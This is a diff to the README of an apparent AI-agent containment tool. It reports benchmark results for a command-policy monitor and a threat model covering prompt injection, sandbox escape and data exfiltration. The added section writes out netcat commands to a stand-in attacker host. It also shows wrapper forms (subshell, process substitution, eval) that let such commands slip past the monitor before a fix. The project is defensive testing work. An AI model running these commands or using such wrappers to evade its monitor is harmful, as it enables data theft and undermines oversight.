@@ -29,7 +29,7 @@ actually leave. Built on the CodeJam starter kit's Kill Switch track.
 | Added per-command decision latency (p95) | — | **~24 µs** |
 
 *Figures from CI run
-[33263104468](https://github.com/wcnjing/CodeJam/actions/runs/33263104468); ranges
+[33294916979](https://github.com/wcnjing/CodeJam/actions/runs/33294916979); ranges
 span its three runners. Computed live in-app at **Security Evaluation**
 (`npm run bench` for the CLI). These are policy **decisions** on a corpus we
 authored, not observed execution — real-world bypasses exist (see Limitations); the physical
@@ -63,7 +63,7 @@ to a control here and to an entry in
 | --- | --- |
 | Prompt injection / tool misuse | Streamed command policy at the Runtime boundary; the injection demo shows the attack arriving inside data the Agent reads |
 | Credential exposure | `.secrets/` is a protected resource; evidence is redacted before storage; 0/33 secret-channel attacks allowed |
-| Sandbox escape | Container Runtime is destroyed on the first denied command; teardown measured at p50 1–2 ms, tail not well characterised |
+| Sandbox escape | Container Runtime is destroyed on the first denied command; teardown measured at p50 1–3 ms, tail not well characterised |
 | Cross-user access / data exfiltration | Run-scoped approval grants, never standing allowlist changes; a live collector proves zero bytes left |
 | Runaway execution | Step budget enforced by the platform, independent of policy mode |
 | Sensitive trace capture | Redaction before the audit store; unbounded-growth risk tracked as TM-OPS-001 |
@@ -302,8 +302,27 @@ Every figure below comes from a CI run on a clean GitHub runner, linked so it ca
 be checked rather than taken on trust. Nothing here was measured only on a
 contributor's laptop.
 
-> **The verification step is itself a finding.** Re-reading each figure against
-> the log of the run it cites has caught wrong numbers **four separate times**,
+> **The verification step is itself a finding, and it has now caught me.**
+> The clearest instance was not a stale figure but an invented one. I reported
+> that the containment window had regressed from 1–2 ms to **92 ms** — a 50x
+> safety-relevant change — and supplied a plausible mechanism for it: the
+> capability engine evaluates on every streamed chunk, so of course teardown grew.
+> The reviewer accepted it and asked for it to be propagated to four documents.
+>
+> It was wrong. Re-checking before editing found **eight observations across three
+> CI runs: seven at 1–2 ms, one at 92 ms.** I had read a single outlier job,
+> generalised it into a systematic regression, and reasoned backwards to a cause
+> that sounded right. Two people passed the number and the mechanism; only
+> re-reading the logs caught it.
+>
+> That is the argument for the discipline in its strongest form. A plausible
+> causal story is exactly what makes a wrong number survive review — it stops
+> feeling like a number and starts feeling like an explanation. The check has to
+> be mechanical, and it has to run even when the claim is one everybody already
+> believes.
+>
+> Re-reading each figure against the log of the run it cites has now caught wrong
+> numbers **five separate times**,
 > and every time it was the same failure: a value carried forward from an earlier
 > build while the text linked a newer run. Correctness metrics are stable, so
 > they survive that unnoticed; **timing figures move every run, so a stale one is
@@ -312,12 +331,11 @@ contributor's laptop.
 > of links is not the same as a document full of verified links.
 
 **Containment is measured, not asserted.** From the denied command being emitted
-to the Runtime process being dead: **p50 1–2 ms** across the run's two POSIX
- jobs.
+to the Runtime process being dead: **p50 1–3 ms** across CI runs.
 
 > **The tail is not well characterised, and for a containment window the tail is
 > the number that matters.** Across eight observations from three CI runs, seven
-> report p50 1–2 ms. One reported **p50 92 ms, max 104 ms**
+> report p50 1–3 ms. One reported **p50 92 ms, max 104 ms**
 > ([run 33294050866](https://github.com/wcnjing/CodeJam/actions/runs/33294050866)).
 > Whether that is runner contention or a real stall is not established: the
 > samples per run are small — 5 in `bench:overhead`, 24 in the token tier — which
@@ -326,7 +344,7 @@ to the Runtime process being dead: **p50 1–2 ms** across the run's two POSIX
  That window is the
 README's own containment race — for exactly that long, a denied Agent is still
 executing — and it had never been quantified.
-([run](https://github.com/wcnjing/CodeJam/actions/runs/33263104468), `npm run bench:overhead`)
+([run](https://github.com/wcnjing/CodeJam/actions/runs/33294916979), `npm run bench:overhead`)
 
 **The middleware's real cost is not the policy decision.** A decision is 4.15–5.05 µs.
 Recording it is the expensive half: `JsonStore.mutate()` clones and rewrites the
@@ -334,7 +352,7 @@ whole database on every call, so writing one policy event is **O(events already
 stored)** — 0.29–0.99 ms at zero events, **10.05–17.87 ms at 5,000**. Growth is exactly
 linear, r² **0.9984–0.9999** across three independent runners, so this is a
 property of the code and not of a machine.
-([run](https://github.com/wcnjing/CodeJam/actions/runs/33263104468), `npm run bench:store`)
+([run](https://github.com/wcnjing/CodeJam/actions/runs/33294916979), `npm run bench:store`)
 
 *The fix is scoped and deliberately not built.* Three options are written up with
 trade-offs; the two cheap ones cap the log by discarding audit records. For a
@@ -431,19 +449,40 @@ Six wrapper forms were added — command substitution, backticks, process
 substitution, eval strings, newline separation, xargs — taking the bank from
 3,430 to **5,488 variants**. The current figure:
 
-| | value |
-| --- | --- |
-| detection | **5,383 / 5,488** (98.09%) |
-| accepted-bypass ratchet | 0 → **105** |
-| families still open | `nc`, `socat`, `openssl` under subshell / process substitution / eval |
+Widening the axis immediately surfaced **105 further bypasses** that had always
+been there — and those are now closed too:
 
-**What the bank can and cannot express.** It expresses the cross product of seven
-host forms, sixteen egress tools, four secret channels and sixteen shell
-wrappers. It cannot express anything outside those axes — encodings, timing,
-multi-command staging, or any wrapper nobody has thought of yet. The 105 open
-bypasses are a pre-existing bare-host class in the shell-parse layer, verified
-present on `main` before this branch touched anything; they are named
-individually in `generate-cli.ts` so the count cannot grow silently.
+| | before widening | after widening | after the fix |
+| --- | --- | --- | --- |
+| detection | 3,416 / 3,430 | 5,383 / 5,488 | **5,488 / 5,488** (100.00%) |
+| accepted-bypass ratchet | 14 | 105 | **0** |
+
+**Those 105 were a defect in the shipping product, not in this branch.** They were
+verified present on `main` before this branch touched anything, and the fix is in
+`main`'s own `shell-parse.ts`. `nc attacker.example 4444` was denied;
+`( nc attacker.example 4444 )`, `cat <(nc …)` and `eval "nc …"` were not — three
+forms that each broke the parser's ability to recognise the tool.
+
+**Why the bank could not see them for so long is structural, and worth stating.**
+A URL survives every wrapper, because `ANY_URL` matches anywhere in the command
+text. A **bare host** is only recoverable from a recognised tool's *argument
+position* — `nc HOST PORT` means a host because `nc` was recognised first. So any
+form that breaks tool recognition opens the bare-host class while leaving the
+URL-carrying variants untouched. Every variant the bank generated for those tools
+carried a URL, so the whole class was invisible to it until an axis existed that
+broke recognition.
+
+**What the bank can and cannot express.** The cross product of seven host forms,
+sixteen egress tools, four secret channels and sixteen shell wrappers. Nothing
+outside those axes — encodings, timing, multi-command staging, or any wrapper
+nobody has thought of yet. The ratchet reaching 0 means the bank finds nothing it
+can express, which is a smaller claim than "there is nothing to find".
+
+**One figure that looks like drift and is not.** The corpus false-positive rate
+reads 1.4% → 1.3% across these commits. Detection did not change: the same single
+false positive (`npm run build -- --base https://cdn…`, a URL used as a build
+constant) is now measured against 75 benign entries instead of 73, because two
+benign guards were added with the fix. Numerator 1 throughout.
 
 **Zero is reported with its denominator and its interval.** "0 secret leaks" is
 not evidence the rate is zero — 33 attempts only buy so much confidence:
@@ -462,8 +501,8 @@ overstating residual risk is the only safe direction for a security number.
 (`npm run bench` — full provenance in `bench-results.json`: commit SHA, Node, OS,
 CPU, corpus size, policy hash)
 
-**CI: 157 tests green on ubuntu-latest, Node 22 and 24.**
-([run](https://github.com/wcnjing/CodeJam/actions/runs/33263104468)) The matrix is
+**CI: 175 tests green on ubuntu-latest, Node 22 and 24.**
+([run](https://github.com/wcnjing/CodeJam/actions/runs/33294916979)) The matrix is
 not redundancy: it separates platform from runtime version, which an earlier
 comparison had confounded.
 
@@ -476,7 +515,7 @@ On Windows: install, typecheck, build, all evaluation harnesses, the offline
 entry point and — after the fix above — the `local-process` runtime provider all
 work. One thing does not:
 
-- **The runtime test suite** — 12 of 157 fail. The fake-Codex stand-in is spawned
+- **The runtime test suite** — 12 of 175 fail. The fake-Codex stand-in is spawned
   via a `#!/usr/bin/env node` shebang and the executable bit; Windows honours
   neither, so every spawn throws `EFTYPE`.
 - ~~**The `local-process` runtime provider**~~ — **fixed**, see the RCE
@@ -505,8 +544,8 @@ in ~3 s on any platform.
 
 **Replay does not prove containment**, and says so at the end of every run.
 Containment is proven separately, spawning for real: **24/24 generated attacks
-terminated the Runtime**, teardown p50 1–2 ms (see the tail caveat above)
-([run](https://github.com/wcnjing/CodeJam/actions/runs/33263104468)). A parity
+terminated the Runtime**, teardown p50 1–3 ms (see the tail caveat above)
+([run](https://github.com/wcnjing/CodeJam/actions/runs/33294916979)). A parity
 test feeds the same recorded bytes to the real runner and to the replay runner
 and requires the same outcome, so the two cannot drift. Fixtures are labelled
 **synthesized, not recorded** — no live model was available to capture from, and
